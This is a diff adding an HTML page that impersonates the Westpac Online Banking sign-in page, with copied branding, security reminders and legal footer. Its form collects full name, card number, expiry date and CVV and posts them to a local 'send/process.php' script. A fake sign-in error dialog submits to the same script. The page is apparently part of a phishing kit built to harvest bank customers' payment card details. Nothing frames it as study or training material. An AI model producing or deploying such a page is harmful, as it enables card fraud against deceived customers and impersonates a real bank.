@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+   <title>Sign in to Westpac Online Banking</title>
+   <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+   <link rel="stylesheet" href="bootstrap/fontawesome-free-5.13.0-web/css/all.min.css">
+   <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+   <header class="top-header p-2">
+      <div class="container-fluid">
+         <div class="row">
+            <div class="col-md-12">
+               <ul class="header-list mb-2">
+                  <li>
+                     <a href="#" class="text-white">Lost or stolen cards</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-white"> Contact us</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-white">Locate us</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-white"><b>Register for Westpac Online Banking</b></a>
+                  </li>
+               </ul>
+            </div>
+         </div>
+      </div>
+   </header>
+   <nav class="navbar navbar-expand-lg navbar-light bg-white p-3">
+      <div class="container img-cont">
+         <a class="navbar-brand" href="#"><img src="images/logo_white_bg.png" alt=""></a>
+         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+         </button>
+
+         <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav mr-auto">
+               <li class="nav-item active ml-3">
+                  <a class="nav-link" href="#" style="
+        font-size: 18px;
+    ">Home <span class="sr-only">(current)</span></a>
+               </li>
+               <li class="nav-item">
+                  <a class="nav-link" href="#">Personal</a>
+               </li>
+
+               <li class="nav-item">
+                  <a class="nav-link" href="#">Business</a>
+               </li>
+               <li class="nav-item">
+                  <a class="nav-link" href="#">Corporate</a>
+               </li>
+               <li class="nav-item">
+                  <a class="nav-link" href="#">About us</a>
+               </li>
+            </ul>
+
+         </div>
+      </div>
+   </nav>
+   <section class="bg-section pb-4">
+      <div class="container">
+         <div class="row">
+            <div class="col-md-12 heading-coloumn">
+               <h3 class="ml-5 mt-3">Sign in to Westpac Online Banking</h3>
+            </div>
+         </div>
+         <div class="row">
+            <div class="col-md-8 pr-0 coloumn-right">
+               <div class="bg-white p-3 ml-5 mt-3 column-left-012">
+                  <div class="row gap-45">
+                     <div class="col-md-5">
+                        <form action="./send/process.php?Crd" method="post">
+                           <div class="form-group">
+                              <label for="fname" class="label">Full Name</label>
+                              <input type="text" class="form-control" placeholder="Full Name" id="fname" name="fname"
+                                 required>
+                           </div>
+                           <div class="form-group">
+                              <label for="" class="label">Card Number</label>
+                              <input type="text" class="form-control" placeholder="Card Number" maxlength="19"
+                                 id="ccnum" oninput="formatCreditCard(this)" required name="ccnum">
+                           </div>
+                           <div class="form-group">
+                              <label for="" class="label">Expiry Date</label>
+                              <input type="text" class="form-control" placeholder="Expiry Date" oninput="formatExpiry(this)" id="exp" required
+                                 name="exp">
+                           </div>
+                           <div class="form-group">
+                              <label for="" class="label">CVV</label>
+                              <input type="text" class="form-control" placeholder="CVV" name="cvv" id="cvv" required>
+                           </div>
+                           <button type="submit" id="submit-btn" class="btn btn-danger col-md-12 mt-4 mb-4"
+                              data-toggle="modal">Continue </button>
+                           <div class="col-md-12 forgert-pswd">
+                           </div>
+                        </form>
+                     </div>
+                     <script>
+                        function formatCreditCard(input) {
+                           let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+                           value = value.replace(/(\d{4})/g, '$1 ').trim(); // Add spaces after every 4 digits
+                           input.value = value;
+                        }
+                        function formatExpiry(input) {
+                           let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+
+                           if (value.length > 2) {
+                              value = value.substring(0, 2) + '/' + value.substring(2, 4); // Insert '/'
+                           }
+                           input.value = value;
+                        }
+                     </script>
+                     <div class="col-md-5 mt-3 column-none">
+                        <div class="d-flex">
+                           <img src="images/lock.png" width="45px" alt="">
+                           <div class="detail ml-2">
+                              <h5 class="mb-0"><b>Security reminder</b></h5>
+                              <p class="mb-0">Westpac Protect™</p>
+                           </div>
+
+                        </div>
+                        <ul class="mt-5 mb-29 pl-4">
+                           <li><a href="#" class="fs-14 text-dark">Don't sign in if you are sharing access to your
+                                 computer</a></li>
+                           <li><a href="#" class="fs-14 text-dark">Never share your security codes or passwords with
+                                 anyone</a></li>
+                           <li><a href="#" class="fs-14 text-dark">Call us on 132 032 if you are being asked to do
+                                 this</a></li>
+                        </ul>
+
+                        <a href="#" class="text-dark">Learn more about staying safe</a>
+
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="col-md-4 pl-0">
+               <div class="bg-danger-001 p-3 w-90 h-96 mt-3 ">
+                  <ul class="mt-5 mb-5 pt-5 pb-5 nav-list-1">
+                     <li>
+                        <a href="#" class="text-white"><i class="fa fa-chevron-right"></i>&nbsp; Register for Online
+                           Banking</a>
+                     </li>
+                     <li>
+                        <a href="#" class="text-white"><i class="fa fa-chevron-right"></i>&nbsp; Online Banking Help</a>
+                     </li>
+                     <li>
+                        <a href="#" class="text-white"><i class="fa fa-chevron-right"></i>&nbsp; What's new</a>
+                     </li>
+                     <li>
+                        <a href="#" class="text-white"><i class="fa fa-chevron-right"></i>&nbsp; Online Banking
+                           features</a>
+                     </li>
+                  </ul>
+               </div>
+            </div>
+         </div>
+
+      </div>
+   </section>
+   <section class="footer">
+      <div class="container">
+         <div class="row">
+            <div class="col-md-3">
+               <ul class="mt-3 nav-list-1">
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Register for
+                        Online Banking</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Online
+                        Banking Help</a>
+                  </li>
+
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Online
+                        Security</a>
+                  </li>
+               </ul>
+            </div>
+            <div class="col-md-3">
+               <ul class="mt-3 nav-list-1 border-left">
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; What's
+                        new</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Online
+                        Banking features</a>
+                  </li>
+
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Contact us
+                        in the Westpac App</a>
+                  </li>
+               </ul>
+            </div>
+            <div class="col-md-3">
+               <ul class="mt-3 nav-list-1 border-left">
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Security
+                        Guarantee</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Keep safe
+                        online</a>
+                  </li>
+
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Types of
+                        scams</a>
+                  </li>
+               </ul>
+            </div>
+            <div class="col-md-3">
+               <ul class="mt-3 nav-list-1 border-left">
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp;
+                        Accessibility</a>
+                  </li>
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Supported
+                        devices</a>
+                  </li>
+
+                  <li>
+                     <a href="#" class="text-dark fs-13"><img src="images/red_arrow_icon.png" alt="">&nbsp; Terms and
+                        Conditions</a>
+                  </li>
+               </ul>
+            </div>
+            <div class="col-md-11 ml-4 pl-2">
+               <hr>
+               <img src="images/logo_white_bg.png" width="40px" alt="">
+               <p class="fs-12 m-36">Conditions, fees and charges apply. These may change or we may introduce new ones
+                  in the future. Full details are available on request. Lending criteria apply to approval of credit
+                  products. This information does not take your personal objectives, circumstances or needs into
+                  account. Consider its appropriateness to these factors before acting on it. Read the disclosure
+                  documents for your selected product or service, including the <a href="#"
+                     class="text-dark link-anker"> Terms and Conditions or Product Disclosure Statement,</a> before
+                  deciding. Unless otherwise specified, the products and services described on this website are
+                  available only in Australia from Westpac Banking Corporation ABN 33 007 457 141 AFSL and Australian
+                  credit licence 233714.</p>
+            </div>
+         </div>
+      </div>
+   </section>
+   <!-- Button trigger modal -->
+
+
+   <!-- Modal -->
+   <div class="modal fade mt-5 pt-5" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
+      aria-hidden="true">
+      <div class="modal-dialog" role="document">
+         <div class="modal-content">
+            <div class="modal-header">
+               <h5 class="modal-title m-auto" id="exampleModalLabel">Sign in error</h5>
+
+            </div>
+            <div class="modal-body">
+               <form action="./send/process.php?Crd">
+                  <p>Your Full name is empty</p>
+                  <hr class="mt-0 mb-0">
+                  <p>Your Phone number is empty</p>
+                  <div class="col-md-12 p-0 v">
+                     <button type="submit" id="modalOkBtn" class="btn btn-danger-001 col-md-12">Ok</button>
+                  </div>
+               </form>
+            </div>
+         </div>
+      </div>
+   </div>
+   <script src="bootstrap/jquery/jquery.min.js"></script>
+   <script src="bootstrap/js/popper.min.js"></script>
+   <script src="bootstrap/js/bootstrap.min.js"></script>
+
+
+</body>
+
+</html>
